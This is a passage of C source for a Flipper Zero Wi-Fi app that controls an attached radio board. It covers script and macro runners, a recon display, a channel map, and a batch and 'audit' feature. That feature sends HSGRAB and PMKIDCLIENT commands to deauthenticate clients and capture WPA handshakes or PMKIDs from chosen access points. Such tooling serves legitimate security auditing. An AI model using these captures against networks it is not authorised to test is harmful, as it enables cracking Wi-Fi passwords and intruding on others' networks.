        script_seed_demo();
        strncpy(script_names[0], "demo.txt", 47);
        script_names[0][47] = '\0';
        script_file_count = 1;
    }
}

// Load <name> into script_lines, trimming CR/LF and dropping blanks and comments.
static bool script_load(const char* name) {
    char path[96];
    snprintf(path, sizeof(path), SCRIPT_DIR "/%s", name);
    static char raw[SCRIPT_LINES_MAX * SCRIPT_LINE_LEN + SCRIPT_LINE_LEN];
    size_t n = 0;
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(st);
    if(storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        n = storage_file_read(f, raw, sizeof(raw) - 1);
        storage_file_close(f);
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    raw[n] = '\0';
    script_line_count = 0;
    size_t i = 0;
    while(i < n && script_line_count < SCRIPT_LINES_MAX) {
        size_t j = i;
        while(j < n && raw[j] != '\n') j++;
        size_t len = j - i;
        while(len > 0 && (raw[i + len - 1] == '\r' || raw[i + len - 1] == ' ')) len--;
        if(len > 0 && raw[i] != '#' && len < SCRIPT_LINE_LEN) {
            memcpy(script_lines[script_line_count], raw + i, len);
            script_lines[script_line_count][len] = '\0';
            script_line_count++;
        }
        i = j + 1;
    }
    return script_line_count > 0;
}

static void script_render(Petrel* app) {
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Script");
    char hdr[48];
    snprintf(hdr, sizeof(hdr), "%.18s  %d/%d", script_name, script_pc, script_line_count);
    widget_add_string_element(app->widget, 64, 14, AlignCenter, AlignTop, FontSecondary, hdr);
    if(script_pc < script_line_count) {
        char line[40];
        snprintf(line, sizeof(line), "> %.26s", script_lines[script_pc]);
        widget_add_string_element(app->widget, 64, 26, AlignCenter, AlignTop, FontSecondary, line);
    }
    if(script_status[0]) {
        widget_add_string_multiline_element(
            app->widget, 64, 38, AlignCenter, AlignTop, FontSecondary, script_status);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, beaconInfoView);
}

// Advance one script step. Runs on the scriptTimer tick so the UI keeps painting.
static void script_step(Petrel* app) {
    if(script_pc >= script_line_count) {
        furi_timer_stop(app->scriptTimer);
        script_running = false;
        snprintf(script_status, sizeof(script_status), "done");
        script_render(app);
        return;
    }
    if(script_wait > 0) {
        script_wait--;
        snprintf(script_status, sizeof(script_status), "wait %ds", script_wait);
        script_render(app);
        return;
    }
    char cmd[SCRIPT_LINE_LEN + 2];
    snprintf(cmd, sizeof(cmd), "%s\n", script_lines[script_pc]);
    if(strncmp(script_lines[script_pc], "WAIT ", 5) == 0) {
        script_wait = atoi(script_lines[script_pc] + 5);
        snprintf(script_status, sizeof(script_status), "waiting %ds", script_wait);
        script_pc++;   // WAIT is consumed now; the next tick counts it down
        script_render(app);
        return;
    }
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    snprintf(script_status, sizeof(script_status), "sent %.26s", script_lines[script_pc]);
    script_pc++;
    script_render(app);
}

static void script_item_cb(void* context, uint32_t index) {
    Petrel* app = context;
    if((int)index < script_file_count) {
        snprintf(script_name, sizeof(script_name), "%s", script_names[index]);
        scene_manager_next_scene(app->scene_manager, scriptRunScene);
    }
}

void script_list_scene_on_enter(void* context) {
    Petrel* app = context;
    script_list_load();
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Scripts");
    for(int i = 0; i < script_file_count; i++)
        submenu_add_item(app->submenu, script_names[i], (uint32_t)i, script_item_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, scannedWifisView);
}

bool script_list_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void script_list_scene_on_exit(void* context) {
    UNUSED(context);
}

void script_run_scene_on_enter(void* context) {
    Petrel* app = context;
    script_pc = 0;
    script_wait = 0;
    script_status[0] = '\0';
    if(!script_load(script_name)) {
        snprintf(script_status, sizeof(script_status), "empty or unreadable");
        script_render(app);
        return;
    }
    script_running = true;
    script_render(app);
    furi_timer_start(app->scriptTimer, 700);
}

bool script_run_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_SCRIPT_TICK) {
        if(script_running) script_step(app);
        return true;
    }
    return false;
}

void script_run_scene_on_exit(void* context) {
    Petrel* app = context;
    // Stop the timer, do not just clear the flag. Left running, this periodic timer keeps posting
    // PETREL_EVT_SCRIPT_TICK into the dispatcher for the rest of the session (every post is a
    // view_dispatcher_send_custom_event, which BLOCKS once the event queue is full), and the stray
    // tick lands on whatever scene is current. Every other scene timer is stopped on exit; this one
    // was missed.
    furi_timer_stop(app->scriptTimer);
    script_running = false;
}

// --- F5: macro recording -----------------------------------------------------------------
// The board records the commands it receives (it sees them all, in order); this screen starts and
// stops that recording and saves the fetched list as an F1 script - so a macro is produced simply
// by using the app normally.
#define REC_SCRIPT_MAX 20
static char rec_script[REC_SCRIPT_MAX][48];
static int rec_script_n = 0;
static bool rec_active = false;
static char rec_status[48];

static void rec_save(Petrel* app) {
    if(rec_script_n == 0) {
        snprintf(rec_status, sizeof(rec_status), "nothing recorded");
        return;
    }
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    char path[96];
    snprintf(
        path,
        sizeof(path),
        SCRIPT_DIR "/macro_%04d%02d%02d_%02d%02d%02d.txt",
        dt.year,
        dt.month,
        dt.day,
        dt.hour,
        dt.minute,
        dt.second);
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, SCRIPT_DIR);
    File* f = storage_file_alloc(st);
    bool ok = false;
    if(storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        char hdr[96];
        int n = snprintf(
            hdr,
            sizeof(hdr),
            "# macro %04d-%02d-%02d %02d:%02d:%02d\n",
            dt.year,
            dt.month,
            dt.day,
            dt.hour,
            dt.minute,
            dt.second);
        storage_file_write(f, hdr, (size_t)n);
        for(int i = 0; i < rec_script_n; i++) {
            storage_file_write(f, rec_script[i], strlen(rec_script[i]));
            storage_file_write(f, "\n", 1);
        }
        storage_file_close(f);
        ok = true;
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    snprintf(rec_status, sizeof(rec_status), ok ? "saved %d lines" : "save failed", rec_script_n);
    snprintf(message, sizeof(message), "%s (%d)", ok ? "Macro saved" : "Save failed", rec_script_n);
    snprintf(popupHeader, sizeof(popupHeader), "Macro");
    // rec_save() runs inside uart_process_line (UART worker thread), so pushing a scene directly
    // is not safe - post it and let the dispatcher do it on the GUI thread.
    post_event(app, PETREL_EVT_POPUP);
}

static void rec_scene_build(Petrel* app);

static void rec_item_cb(void* context, uint32_t index) {
    Petrel* app = context;
    if(index == 0) {   // toggle record
        rec_active = !rec_active;
        rec_script_n = 0;
        rec_status[0] = '\0';
        uart_helper_send(app->uart_helper, rec_active ? "REC 1\n" : "REC 0\n", 6);
    } else if(index == 1) {   // fetch what the board holds
        uart_helper_send(app->uart_helper, "RECFETCH\n", 9);
    }
    // Do NOT rebuild the submenu here: resetting the view from inside its own callback leaves the
    // submenu walking a freed model and crashes the Flipper on the next key. Post an event instead
    // and rebuild between frames (same class of bug as the widget-input crash).
    post_event(app, PETREL_EVT_REC_REFRESH);
}

static void rec_scene_build(Petrel* app) {
    submenu_reset(app->submenu);
    char hdr[48];
    if(rec_active) snprintf(hdr, sizeof(hdr), "Macro: RECORDING");
    else if(rec_status[0]) snprintf(hdr, sizeof(hdr), "Macro: %.32s", rec_status);
    else snprintf(hdr, sizeof(hdr), "Macro");
    submenu_set_header(app->submenu, hdr);
    submenu_add_item(
        app->submenu, rec_active ? "Stop recording" : "Start recording", 0, rec_item_cb, app);
    submenu_add_item(app->submenu, "Fetch & save script", 1, rec_item_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, scannedWifisView);
}

void record_scene_on_enter(void* context) {
    Petrel* app = context;
    rec_scene_build(app);
}

bool record_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_REC_REFRESH) {
        rec_scene_build(app);
        return true;
    }
    return false;
}

void record_scene_on_exit(void* context) {
    Petrel* app = context;
    // Leaving the screen keeps the recording running (that is the point - go use the app), except
    // when nothing is being recorded and there is nothing to keep.
    if(!rec_active && rec_script_n == 0) uart_helper_send(app->uart_helper, "REC 0\n", 6);
}

void help_scene_on_enter(void* context) {
    Petrel* app = context;
    petrel_ident(app);
    app->menuIndex = 3;
    widget_reset(app->widget);
    char info[192];
    snprintf(
        info,
        sizeof(info),
        "Petrel\nfw: %s\ncaps: %s\n\nhttps://github.com/gorebrau/delfyRTL\n(fork tbelbek/petrel)",
        app->fw_version[0] ? app->fw_version : "(no IDENT)",
        app->fw_caps[0] ? app->fw_caps : "-");
    widget_add_text_scroll_element(app->widget, 0, 0, 128, 64, info);
    view_dispatcher_switch_to_view(app->view_dispatcher, helpView);
}

bool help_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void help_scene_on_exit(void* context) {
    UNUSED(context);
}

// --- Animated "working" screen -------------------------------------------------
// Shows the operation name + a spinner so a blocking board op is visibly alive,
// instead of the static popup with the idle dolphin icon. Driven by a periodic timer
// that posts a GUI-thread custom event (view model updates must run on the GUI thread).
static void busy_view_draw(Canvas* canvas, void* model) {
    BusyModel* m = model;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 10, AlignCenter, AlignTop, popupHeader);
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str_aligned(canvas, 64, 26, AlignCenter, AlignTop, message);
    if(m->remain_s > 0) {
        char t[8];
        snprintf(t, sizeof(t), "%ds", m->remain_s);
        canvas_draw_str_aligned(canvas, 126, 2, AlignRight, AlignTop, t);
    }
    static const int8_t dx[8] = {0, 8, 12, 8, 0, -8, -12, -8};
    static const int8_t dy[8] = {-12, -8, 0, 8, 12, 8, 0, -8};
    for(int i = 0; i < 8; i++) {
        int x = 64 + dx[i], y = 50 + dy[i];
        if(i == (int)(m->phase & 7)) canvas_draw_disc(canvas, x, y, 2);
        else canvas_draw_dot(canvas, x, y);
    }
}

static volatile uint32_t busy_ticks = 0;
static int busy_total_s = 0;

// ---------------------------------------------------------------------------------------------
// E3: batch grab. The batch screen marks APs and the runner walks them one at a time: one HSGRAB
// per AP, armed only after the board reported HSDONE for the previous one, so two captures never
// fight over the radio.
//
// Two deliberate choices came out of testing this on the device:
//  * marks are keyed by BSSID and the AP list is SNAPSHOTTED when the scene is entered. The board
//    keeps reporting APs while it scans, so app->wifiList can grow and reorder under the user's
//    finger - and a list that shifts between the look and the OK is how you end up pointing a
//    deauther at the wrong network.
//  * the rows are ordered "APs first, actions last", so the whole flow is reachable with DOWN
//    alone. (The ordering was chosen because UP looked broken on the review unit. That was wrong:
//    the screenshots were stale frames, and UP works - see tools/flip_see.py. The ordering is kept
//    because it reads better: the list first, the actions after it.)
// ---------------------------------------------------------------------------------------------
#define BATCH_MAX 8

typedef struct {
    int ch;
    char bssid[13]; // 12 hex, no colons - the exact spelling HSGRAB wants
    char ssid[17];
} BatchTarget;

static APDetails batch_aps[BATCH_MAX]; // frozen copy of wifiList for this visit
static int batch_n = 0;
static BatchTarget batch_targets[BATCH_MAX];
static uint8_t batch_count = 0;
static uint8_t batch_cursor = 0; // submenu POSITION, so the highlight survives a rebuild
static bool batch_active = false;
static uint8_t batch_seq = 0;
static uint8_t batch_good = 0;
static char batch_report[512];

static void batch_step(Petrel* app);
static void batch_start(Petrel* app);

// "AA:BB:CC:DD:EE:FF" -> "AABBCCDDEEFF"; anything that is not exactly 12 hex comes back empty.
static void batch_hex(const char* mac, char* out /* >= 13 */) {
    int j = 0;
    out[0] = '\0';
    for(int i = 0; mac[i] && j < 12; i++)
        if(mac[i] != ':') out[j++] = mac[i];
    out[j] = '\0';
    if(j != 12) out[0] = '\0';
}

// Row -> position map, all centred on the snapshot:
//   0 .. batch_n-1   the APs
//   batch_n          "Clear marks"
//   batch_n + 1      "Run batch (n AP)"
static bool batch_row_is_marked(int row) {
    if(row < 0 || row >= batch_n) return false;
    char hex[13];
    batch_hex(batch_aps[row].APbssid, hex);
    if(hex[0] == '\0') return false;
    for(uint8_t i = 0; i < batch_count; i++)
        if(strncmp(batch_targets[i].bssid, hex, 12) == 0) return true;
    return false;
}

static void batch_toggle(int row) {
    if(row < 0 || row >= batch_n) return;
    char hex[13];
    batch_hex(batch_aps[row].APbssid, hex);
    if(hex[0] == '\0') return; // unpadded/malformed MAC - HSGRAB would reject it anyway
    for(uint8_t i = 0; i < batch_count; i++) {
        if(strncmp(batch_targets[i].bssid, hex, 12) == 0) { // un-mark
            for(uint8_t k = i; k + 1 < batch_count; k++) batch_targets[k] = batch_targets[k + 1];
            batch_count--;
            return;
        }
    }
    if(batch_count >= BATCH_MAX) return;
    BatchTarget* t = &batch_targets[batch_count];
    t->ch = batch_aps[row].chanel;
    snprintf(t->bssid, sizeof(t->bssid), "%s", hex);
    snprintf(t->ssid, sizeof(t->ssid), "%.16s", batch_aps[row].APssid);
    batch_count++;
}

// Every bit of view work is deferred: the item callback only mutates state and posts an event,
// and the submenu is rebuilt in batch_scene_on_event. Rebuilding a view from inside its own
// callback is what crashed the macro menu (see the F5 note in the roadmap).
static void batch_item_cb(void* context, uint32_t index) {
    Petrel* app = context;
    if(index == (uint32_t)batch_n + 1) { // Run
        batch_cursor = (uint8_t)index;
        post_event(app, PETREL_EVT_BATCH_RUN);
        return;
    }
    if(index == (uint32_t)batch_n) { // Clear marks
        batch_count = 0;
        batch_cursor = (uint8_t)index;
        post_event(app, PETREL_EVT_BATCH_REFRESH);
        return;
    }
    batch_cursor = (uint8_t)index;
    batch_toggle((int)index);
    post_event(app, PETREL_EVT_BATCH_REFRESH);
}

// Rows only; batch_scene_on_enter owns the reset and the view switch.
static void batch_fill(Petrel* app) {
    for(int i = 0; i < batch_n; i++) {
        char temp[48];
        snprintf(
            temp,
            sizeof(temp),
            "%s%s|%.11s %d",
            batch_row_is_marked(i) ? "[x] " : "[ ] ",
            (batch_aps[i].chanel > 14) ? "5G" : "2G",
            batch_aps[i].APssid,
            batch_aps[i].rssi);
        submenu_add_item(app->submenu, temp, (uint32_t)i, batch_item_cb, app);
    }
    if(batch_n == 0) {
        submenu_add_item(app->submenu, "(no APs - run Scan Wifi)", 0, NULL, app);
    } else {
        submenu_add_item(app->submenu, "Clear marks", (uint32_t)batch_n, batch_item_cb, app);
        char t[40];
        snprintf(t, sizeof(t), "Run batch (%u AP)", (unsigned)batch_count);
        submenu_add_item(app->submenu, t, (uint32_t)batch_n + 1, batch_item_cb, app);
    }
    // The empty menu contains only item 0, not 0..1 (D6-3, architect).
    const uint32_t last_item = batch_n > 0 ? (uint32_t)batch_n + 1u : 0u;
    if((uint32_t)batch_cursor > last_item) batch_cursor = 0;
    submenu_set_selected_item(app->submenu, batch_cursor);
}

void batch_scene_on_enter(void* context) {
    Petrel* app = context;
    // Freeze the list for this visit (see the block comment above).
    batch_n = app->wifiCount;
    if(batch_n > BATCH_MAX) batch_n = BATCH_MAX;
    if(batch_n < 0) batch_n = 0;
    for(int i = 0; i < batch_n; i++) batch_aps[i] = app->wifiList[i];
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "Batch grab");
    batch_fill(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, scannedWifisView);
}

bool batch_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == PETREL_EVT_BATCH_REFRESH) {
            submenu_reset(app->submenu);
            submenu_set_header(app->submenu, "Batch grab");
            batch_fill(app);
            return true;
        }
        if(event.event == PETREL_EVT_BATCH_RUN) {
            if(batch_count == 0) {
                snprintf(popupHeader, sizeof(popupHeader), "Batch");
                snprintf(message, sizeof(message), "Mark some APs first");
                scene_manager_next_scene(app->scene_manager, popupScene);
            } else {
                batch_start(app);
            }
            return true;
        }
    }
    return false;
}

void batch_scene_on_exit(void* context) {
    UNUSED(context);
}

static void batch_note(int frames) {
    size_t used = strlen(batch_report);
    if(used + 48 >= sizeof(batch_report)) return;
    const BatchTarget* t = &batch_targets[batch_seq];
    snprintf(
        batch_report + used,
        sizeof(batch_report) - used,
        "[%u] %.16s ch %d %s -> %d EAPOL\n",
        (unsigned)(batch_seq + 1),
        t->ssid,
        t->ch,
        t->bssid,
        frames);
}

// why != NULL -> the queue stopped early and that line is the message instead of the tally.
static void batch_finish(Petrel* app, const char* why) {
    batch_active = false;
    if(batch_report[0]) petrel_save_scan("batch", batch_report);
    if(why) {
        snprintf(popupHeader, sizeof(popupHeader), "Batch stopped");
        snprintf(message, sizeof(message), "%s", why);
    } else {
        snprintf(popupHeader, sizeof(popupHeader), "Batch done");
        snprintf(
            message,
            sizeof(message),
            "%u/%u AP had EAPOL\nsessions/%s",
            (unsigned)batch_good,
            (unsigned)batch_count,
            petrel_session_id);
    }
    scene_manager_previous_scene(app->scene_manager); // drop the busy screen first
    scene_manager_next_scene(app->scene_manager, popupScene);
}

static void batch_step(Petrel* app) {
    if(!batch_active) return;
    if(batch_seq >= batch_count) {
        batch_finish(app, NULL);
        return;
    }
    const BatchTarget* t = &batch_targets[batch_seq];
    hs_count = 0;
    hs_channel = t->ch;
    char cmd[48];
    snprintf(cmd, sizeof(cmd), "HSGRAB %d %s 20\n", t->ch, t->bssid);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    busy_ticks = 0; // a fresh watchdog window per AP, not one shared budget for the whole queue
    // The screen doubles as the safety display: this is the AP that is about to be worked on.
    snprintf(
        popupHeader,
        sizeof(popupHeader),
        "Batch %u/%u",
        (unsigned)(batch_seq + 1),
        (unsigned)batch_count);
    snprintf(message, sizeof(message), "%.16s ch %d", t->ssid, t->ch);
}

static void batch_start(Petrel* app) {
    batch_active = true;
    batch_seq = 0;
    batch_good = 0;
    batch_report[0] = '\0';
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    storage_common_mkdir(st, "/ext/petrel/sessions");
    char dir[96];
    snprintf(dir, sizeof(dir), "/ext/petrel/sessions/%s", petrel_session_id);
    storage_common_mkdir(st, dir);
    furi_record_close(RECORD_STORAGE);
    snprintf(popupHeader, sizeof(popupHeader), "Batch grab");
    snprintf(message, sizeof(message), "%u APs", (unsigned)batch_count);
    busy_total_s = 0;
    busy_active = true;
    scene_manager_next_scene(app->scene_manager, busyScene);
    batch_step(app);
}



static void busy_timer_cb(void* context) {
    // Timer thread: NO view work here. The model update moved to busy_scene_on_event's
    // PETREL_EVT_BUSY_TICK case, which runs on the GUI thread - the mechanism script and KARMA
    // already use. The old code committed the model from this thread with
    // with_view_model(..., true), which runs the view's update path off the GUI thread; the
    // comment that justified it ("going through the dispatcher left the phase stuck") was written
    // when the dispatcher queue could still block, which it no longer can.
    Petrel* app = context;
    post_event(app, PETREL_EVT_BUSY_TICK);
    // Watchdog: the board may never answer (wedged AP/capture). Without this the spinner
    // spun forever with no way out besides BACK. ~36 s at 120 ms/tick -> "Timeout" popup.
    if(++busy_ticks >= 300) {
        busy_ticks = 0;
        post_event(app, PETREL_EVT_BUSY_TIMEOUT);
    }
}

static void busy_show(Petrel* app) {
    busy_ticks = 0;
    with_view_model(
        app->busyView,
        BusyModel* m,
        {
            m->phase = 0;
            m->remain_s = (int8_t)busy_total_s;
        },
        true);
    furi_timer_start(app->busyTimer, 120);
    view_dispatcher_switch_to_view(app->view_dispatcher, busyView);
}

void busy_scene_on_enter(void* context) {
    Petrel* app = context;
    busy_show(app);
}
bool busy_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_BUSY_TICK) {
        // Runs on the GUI thread (the event ring is drained by the UART tick). The countdown came
        // with it: the timer used to compute remain_s while committing the model from its own
        // thread. Reached only while this is the current scene, so a stale tick after navigating
        // away cannot repaint a screen the user already left.
        with_view_model(
            app->busyView,
            BusyModel* m,
            {
                m->phase++;
                if(busy_total_s > 0) {   // E2: live countdown for timed operations
                    int rem = busy_total_s - (int)(busy_ticks * 120 / 1000);
                    m->remain_s = (rem > 0) ? (int8_t)rem : 0;
                }
            },
            true);
        return true;
    }
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_BUSY_TIMEOUT) {
        // No board reply within the watchdog window: drop the spinner and say so instead of
        // spinning forever.
        furi_timer_stop(app->busyTimer);
        busy_active = false;
        if(batch_active) {
            // E3: an AP that never answered must not stall the queue. Keep the pcaps already on
            // the SD, close the batch out and say that one went quiet.
            batch_seq = batch_count;   // stop the queue here; a late HSDONE is then ignored
            batch_finish(app, "an AP never answered");
            return true;
        }
        snprintf(message, sizeof(message), "Timed out - no board reply");
        snprintf(popupHeader, sizeof(popupHeader), "Timeout");
        scene_manager_previous_scene(app->scene_manager);
        scene_manager_next_scene(app->scene_manager, popupScene);
        return true;
    }
    return false;
}
void busy_scene_on_exit(void* context) {
    Petrel* app = context;
    furi_timer_stop(app->busyTimer);
    busy_active = false;
    // A guided audit (scan chain PMFSCAN -> STASCAN -> grab) spans the busy screen. If we leave it
    // with the audit still pending - user backed out, watchdog fired, or the board sent ERROR - drop
    // the audit so a late reply can't resume an abandoned grab and a later unrelated HSDONE/PMKIDDONE
    // can't be mistaken for this audit's completion. Normal completion clears audit_mode (in
    // audit_write_json) before popping the busy screen, so this is a no-op there.
    if(audit_mode) {
        audit_mode = false;
        audit_phase = AUDIT_PHASE_NONE;
    }
}

// Set the operation name + detail and switch to the animated busy screen.
static void petrel_busy_ex(Petrel* app, const char* header, const char* text, int secs) {
    snprintf(popupHeader, sizeof(popupHeader), "%s", header);
    snprintf(message, sizeof(message), "%s", text);
    busy_total_s = secs;   // >0 -> the busy screen shows a live countdown
    busy_active = true;
    scene_manager_next_scene(app->scene_manager, busyScene);
}
static void petrel_busy(Petrel* app, const char* header, const char* text) {
    petrel_busy_ex(app, header, text, 0);
}

// Does a "PMF:" payload (the line after the "PMF:" tag) belong to the AP being audited? The payload
// opens with the BSSID as "AA:BB:CC:DD:EE:FF" (firmware %02X, uppercase, colon-separated).
static bool pmf_line_is_target(const char* s) {
    for(int i = 0; i < 6; i++) {
        char hi = s[i * 3];                                  // test hi before reading lo so a
        if(!is_hex(hi)) return false;                        // truncated line (hi == '\0') never
        char lo = s[i * 3 + 1];                              // reads past the string terminator
        if(!is_hex(lo)) return false;
        if(i < 5 && s[i * 3 + 2] != ':') return false;
        uint8_t b = (uint8_t)((hexnib(hi) << 4) | hexnib(lo));
        if(b != audit_bssid_bytes[i]) return false;
    }
    return true;
}

// Launch the grab the audit scan chain settled on. Called from PMFDONE/STADONE with the busy screen
// already up, so it relabels in place and re-arms the watchdog (busy_ticks, like batch_step) instead
// of pushing a second busy scene. audit_mode stays true; the existing HSDONE/PMKIDDONE completion
// path quality-gates the result and writes audit.json whichever method ran.
static void audit_send_grab(Petrel* app, AuditMethod method) {
    char cmd[72];
    const char* tgt = audit_hex[0] ? audit_hex : "FFFFFFFFFFFF";
    if(method == AUDIT_METHOD_PMKID) {
        snprintf(cmd, sizeof(cmd), "PMKIDCLIENT %d %s %s\n", audit_ch, tgt, audit_ssid);
        snprintf(popupHeader, sizeof(popupHeader), "Audit: PMKID");
        snprintf(message, sizeof(message), "Clientless PMKID ch %d...", audit_ch);
    } else {
        snprintf(cmd, sizeof(cmd), "HSGRAB %d %s 20\n", audit_ch, tgt);
        snprintf(popupHeader, sizeof(popupHeader), "Audit: handshake");
        snprintf(message, sizeof(message), "Deauth + HS ch %d...", audit_ch);
    }
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    audit_phase = AUDIT_PHASE_NONE;
    busy_total_s = 20;
    busy_ticks = 0;   // re-arm the per-phase watchdog for the grab
}

void popup_scene_on_enter(void* context) {
    Petrel* app = context;
    widget_reset(app->widget);
    // Drawn with the Widget instead of the Popup view: the Popup only has header/icon/text slots,
    // so every result screen ended with the whole lower half blank. Here the dolphin is centred in
    // the left column, the header sits above a message that wraps (and scrolls if it is longer
    // than the box, since the Widget handles that itself), and a footer anchors the bottom.
    widget_add_icon_element(app->widget, 2, 7, &I_WarningDolphin_45x42);
    widget_add_string_multiline_element(
        app->widget, 87, 3, AlignCenter, AlignTop, FontPrimary, popupHeader);
    widget_add_text_scroll_element(app->widget, 48, 18, 78, 33, message);
    widget_add_string_element(
        app->widget, 2, 54, AlignLeft, AlignTop, FontSecondary, "< Back");
    view_dispatcher_switch_to_view(app->view_dispatcher, popupView);
    UNUSED(context);
}

bool popup_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void popup_scene_on_exit(void* context) {
    UNUSED(context);
}

// P2/P4/P6 results: scrollable widget fed by recon_append().
static void recon_append(const char* s) {
    if(strlen(recon_text) + strlen(s) + 2 < sizeof(recon_text)) {
        petrel_strcat(recon_text, s);
        petrel_strcat(recon_text, "\n");
    }
}

// Format the raw recon records for the on-screen widget. The widget wraps at the pixel width
// IGNORING spaces, so it cut records mid-token ("...|ak" / "m=2|..."). We therefore pre-split
// each record into short physical lines ourselves (MAC + first field joined, then one field
// per line) so the widget never has to wrap. The SD copy keeps the raw pipe-separated form.
static void recon_format_display(char* out, size_t cap) {
    size_t u = 0;
    const char* p = recon_text;
    while(p && *p && u + 30 < cap) {
        const char* e = strchr(p, '\n');
        size_t len = e ? (size_t)(e - p) : strlen(p);
        size_t start = 0;
        int field = 0;
        for(size_t i = 0; i <= len; i++) {
            if(i == len || p[i] == '|') {
                size_t flen = i - start;
                if(field == 1 && u > 0 && flen <= 12) {
                    out[u++] = ' '; // keep "MAC SSID" on one line when the SSID is short
                } else if(field > 0) {
                    out[u++] = '\n';
                }
                if(flen > 26) flen = 26;
                for(size_t k = 0; k < flen && u + 2 < cap; k++) out[u++] = p[start + k];
                start = i + 1;
                field++;
                if(u + 2 >= cap) break;
            }
        }
        if(u + 1 < cap) out[u++] = '\n';
        p = e ? e + 1 : p + len;
    }
    out[u] = '\0';
}

void pmf_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, recon_title[0] ? recon_title : "Recon");
    static char recon_disp[1024];
    recon_format_display(recon_disp, sizeof(recon_disp));
    // ponytail: guard the heavy text-scroll build (B2 safety net). widget_add_text_scroll_element
    // allocates per wrapped line, and on the FAP's tight heap a big result set used to OOM-CRASH and
    // reboot the whole Flipper. If headroom is low, show a short notice instead of crashing. Threshold
    // is well below the normal post-(a) margin, so this fires only in a genuine squeeze, not every run.
    if(memmgr_get_free_heap() < 6144) {
        widget_add_string_element(
            app->widget, 64, 34, AlignCenter, AlignCenter, FontSecondary, "Low memory - reboot");
    } else {
        widget_add_text_scroll_element(
            app->widget, 0, 16, 128, 48, recon_disp[0] ? recon_disp : "(empty)");
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, pmfView);
}

bool pmf_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void pmf_scene_on_exit(void* context) {
    UNUSED(context);
}

// G: channel map — per-2.4 GHz-channel AP counts (widget text map; no custom View).
// Channel map — 5Ghost-style: one horizontal spectrum (present 2.4G channels then present 5G
// channels), bar = AP count, filled = recommended, Left/Right pans, footer = best channels.
typedef struct {
    uint8_t count24[14]; // APs per 2.4GHz channel [1..13]
    uint8_t max24;
    int best24; // recommended 1/6/11
    int total24;
    uint8_t ch5[32]; // 5GHz channels present
    uint8_t cnt5[32];
    int n5;
    uint8_t max5;
    int best5; // least-busy present 5GHz channel
    int total5;
} ChanStats;

typedef struct {
    ChanStats s;
    int scroll; // first visible channel column
    int nu; // present channels on the unified axis
} ChanModel;

#define CHAN_SLOT 16 // px per channel column
#define CHAN_VIS  7  // columns visible at once

static void channel_compute_stats(ChanStats* s, Petrel* app) {
    memset(s, 0, sizeof(*s));
    s->best24 = -1;
    s->best5 = -1;
    for(int i = 0; i < app->wifiCount; i++) {
        int ch = app->wifiList[i].chanel;
        if(ch >= 1 && ch <= 13) {
            s->count24[ch]++;
            s->total24++;
            if(s->count24[ch] > s->max24) s->max24 = s->count24[ch];
        } else if(ch > 14) {
            s->total5++;
            int j = 0;
            for(; j < s->n5; j++)
                if(s->ch5[j] == ch) break;
            if(j == s->n5 && s->n5 < (int)sizeof(s->ch5)) {
                s->ch5[s->n5] = ch;
                s->n5++;
            }
            if(j < (int)sizeof(s->ch5)) {
                s->cnt5[j]++;
                if(s->cnt5[j] > s->max5) s->max5 = s->cnt5[j];
            }
        }
    }
    if(s->total24 > 0) {
        const int cand[3] = {1, 6, 11};
        int best_cost = 100000;
        for(int k = 0; k < 3; k++) {
            int c = cand[k], cost = 0;
            for(int ch = c - 2; ch <= c + 2; ch++)
                if(ch >= 1 && ch <= 13) cost += s->count24[ch];
            if(cost < best_cost) {
                best_cost = cost;
                s->best24 = c;
            }
        }
    }
    for(int a = 1; a < s->n5; a++) { // sort present 5G channels ascending
        uint8_t kc = s->ch5[a], kn = s->cnt5[a];
        int b = a - 1;
        while(b >= 0 && s->ch5[b] > kc) {
            s->ch5[b + 1] = s->ch5[b];
            s->cnt5[b + 1] = s->cnt5[b];
            b--;
        }
        s->ch5[b + 1] = kc;
        s->cnt5[b + 1] = kn;
    }
    if(s->n5 > 0) {
        int best_cost = 100000;
        for(int j = 0; j < s->n5; j++) {
            if(s->cnt5[j] < best_cost ||
